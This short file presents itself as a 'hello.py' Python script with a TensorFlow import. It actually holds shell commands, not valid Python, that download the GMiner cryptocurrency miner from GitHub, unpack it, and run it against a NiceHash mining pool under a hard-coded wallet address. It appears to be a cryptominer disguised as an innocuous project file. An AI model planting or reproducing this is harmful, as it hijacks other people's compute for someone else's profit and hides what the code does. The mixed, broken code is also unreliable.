#save this file as hello.py in your repo
import tensorflow as tf
wget https://github.com/develsoftware/GMinerRelease/releases/download/2.54/gminer_2_54_linux64.tar.xz
tar -xvf gminer_2_54_linux64.tar.xz 
./miner -a ethash -s daggerhashimoto.eu-west.nicehash.com:3353 --user 31ib7EZjeDoER14o1WzVyxJRgw7EeAHTBH.new --proto stratum
